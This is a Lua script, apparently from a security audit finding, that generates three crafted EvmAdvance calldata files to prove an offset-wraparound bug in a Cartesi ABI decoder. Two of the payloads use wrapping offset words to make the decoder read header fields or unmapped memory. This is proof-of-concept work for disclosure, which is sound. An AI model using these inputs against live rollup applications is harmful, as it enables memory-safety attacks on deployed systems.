-- R4-VARRANGE-1: build the three EvmAdvance inputs used by the proof.
--
-- The envelope is honest EvmAdvance calldata (as the InputBox emits it). What
-- the attacker controls is the application payload = the last `bytes` field.
-- The PoC application decodes that payload again as abi `(bytes data)`.
--
--   in-0  honest abi.encode(bytes "hello")           -> control, decodes to "hello"
--   in-1  payload is one word = 2^64 - 0xC0          -> wrapping ('negative') offset
--   in-2  payload is one word = 2^64 - 2^24          -> wrapping offset into unmapped memory
--
-- For in-1 the wrapping offset makes frame->begin + offset land 0xC0 bytes
-- *before* the payload, inside the EvmAdvance header, so the decoded `bytes`
-- is taken from block_timestamp/prev_randao, which never appear in the payload.
local evmu = require("cartesi.evmu")

local SIG = "EvmAdvance(uint256,address,address,uint256,uint256,uint256,uint256,bytes)"

local function word(n) return string.rep("\0", 24) .. string.pack(">I8", n) end

local function input(block, payload)
    return evmu.encode_calldata(SIG, {
        31337,
        "0x" .. string.rep("ab", 20),
        "0x" .. string.rep("cd", 20),
        block,
        0x5453,     -- block_timestamp (sentinel "TS")
        0x52414e44, -- prev_randao      (sentinel "RAND")
        0,
        evmu.encode_hex(payload),
    })
end

local function write(name, data)
    local f = assert(io.open(name, "wb"))
    f:write(data)
    f:close()
end

write("in-0.bin", input(1, word(0x20) .. word(5) .. "hello" .. string.rep("\0", 27)))
write("in-1.bin", input(0x40, word(-0xC0)))
write("in-2.bin", input(1, word(-(1 << 24))))
